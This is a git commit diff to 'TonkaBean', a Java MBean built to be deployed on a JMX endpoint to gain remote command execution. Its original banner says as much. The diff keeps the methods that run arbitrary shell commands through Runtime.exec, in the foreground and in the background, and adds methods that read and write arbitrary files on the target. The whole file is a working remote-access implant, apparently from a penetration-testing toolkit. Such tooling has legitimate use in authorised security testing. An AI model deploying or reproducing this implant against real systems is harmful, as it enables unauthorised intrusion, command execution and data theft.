d2eedd7f7cb7972a730d157687adced4cc2d1d5c
TNeitzel <qtc_de@outlook.com>
2020-10-03 08:06:39 +0200

    Update Tonka Bean
    Added additional functionalities to the tonka-bean (file upload and file
    download). Also modified the exception handling.

--- tonka-bean/src/de/qtc/tonkabean/TonkaBean.java
+++ tonka-bean/src/de/qtc/tonkabean/TonkaBean.java
@@ -1,62 +1,59 @@
 package de.qtc.tonkabean;
 
 import java.io.*;
+import java.nio.file.Files;
  
 public class TonkaBean implements TonkaBeanMBean {
 
-    public static void main(String[] argv) {
+    public static void main(String[] argv)
+    {
       System.out.println("[+] Hi! I'm the tonka-bean.");
-      System.out.println("[+] Deploy me on a JMX endpoint to obtain command execution.");
-      System.out.println("[+]");
-      System.out.println("[+] Available methods are:");
-      System.out.println("[+]");
-      System.out.println("[+] \tpublic String ping()");
-      System.out.println("[+] \t\tReturns the message 'Pong!'");
-      System.out.println("[+]");
-      System.out.println("[+] \tpublic String executeCommand(String command)");
-      System.out.println("[+] \t\tExecutes 'command' and returns the response");
-      System.out.println("[+]");
-      System.out.println("[+] \tpublic String executeCommandBackground(String command)");
-      System.out.println("[+] \t\tExecutes 'command' in the background and returns status message");
-      System.out.println("[+]");
-      System.out.println("[+] Happy hacking :D");
+      System.out.println("[+] Deploy me on a JMX endpoint and I can do some useful things for you :)");
     }
 
-    public String executeCommand(String command) {
-        try {
-            Runtime runTime = Runtime.getRuntime();
-            Process proc = runTime.exec(command);
-            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
-            String stdout_err_data = "";
-            String s;
-            while ((s = stdInput.readLine()) != null) {
-                stdout_err_data += s+"\n";
-            }
-            while ((s = stdError.readLine()) != null) {
-                stdout_err_data += s+"\n";
-            }
-            proc.waitFor();
-            return stdout_err_data;
-        } catch (Exception e) {
-            return e.toString();
+    public String executeCommand(String command) throws IOException, InterruptedException
+    {
+        Runtime runTime = Runtime.getRuntime();
+        Process proc = runTime.exec(command);
+        
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+
+        String s;
+        String stdout_err_data = "";
+        
+        while ((s = stdInput.readLine()) != null) {
+            stdout_err_data += s+"\n";
         }
+        
+        while ((s = stdError.readLine()) != null) {
+            stdout_err_data += s+"\n";
+        }
+        
+        proc.waitFor();
+        return stdout_err_data;
     }
 
-    public String executeCommandBackground(String command) {
-        try {
-            Runtime runTime = Runtime.getRuntime();
-            Process proc = runTime.exec(command);
-        } catch (Exception e) {
-            String errorResponse = "Failure while launching the command...\n";
-            errorResponse = errorResponse + "The following exception was thrown:\n";
-            errorResponse = errorResponse + e.toString();
-            return e.toString();
-        }
-        return "Command was sucessfully launched";
+    public void executeCommandBackground(String command) throws IOException
+    {
+        Runtime runTime = Runtime.getRuntime();
+        runTime.exec(command);
     }
 
     public String ping() {
-        return "Pong!";
+        return "pong!";
     }
+
+	public byte[] downloadFile(String filename) throws IOException
+	{
+		File file = new File(filename);
+		return Files.readAllBytes(file.toPath());
+	}
+
+	public void uploadFile(String destination, byte[] content) throws IOException
+	{
+		FileOutputStream stream = new FileOutputStream(destination);
+		stream.write(content);
+		stream.close();
+	}
 }
